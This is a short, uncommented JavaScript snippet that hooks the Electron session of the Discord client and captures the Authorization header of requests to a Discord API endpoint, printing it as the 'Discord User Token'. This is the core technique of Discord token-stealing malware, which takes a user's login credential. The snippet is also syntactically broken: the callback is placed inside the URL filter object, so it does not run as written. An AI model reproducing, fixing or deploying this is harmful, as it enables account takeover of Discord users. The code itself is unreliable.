require("electron").session.defaultSession.webRequest
	.onBeforeSendHeaders({urls:['https://discordapp.com/api/v6/science'], (details, callback) => {
        	console.log("Discord User Token:", details.requestHeaders.Authorization)
	        callback(details)
})
